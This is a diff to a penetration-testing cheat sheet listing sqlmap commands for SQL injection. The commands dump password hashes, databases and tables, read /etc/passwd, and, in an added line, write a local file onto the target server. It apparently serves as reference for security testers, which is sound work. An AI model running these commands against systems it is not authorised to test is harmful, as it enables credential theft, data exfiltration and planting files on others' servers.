@@ -130,13 +130,17 @@ sqlmap -r req --batch
 sqlmap -r req --batch --passwords
 # Get DB
 sqlmap -r req --batch --dbs
-sqlmap -r req --batch --fetch --tables -D db
+sqlmap -r req --batch --tables -D db
 sqlmap -r req --batch --dump -T table -D db
 # Check Privilege of DB
 sqlmap -r req --privileges
 # Read file
 sqlmap -r req --file-read=/etc/passwd
+# Upload file
+sqlmap -r req --file-write=/local/file --file-dest=/dest/path
 ```
+
+[SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
 ### Turbo SQLmap
 ```bash
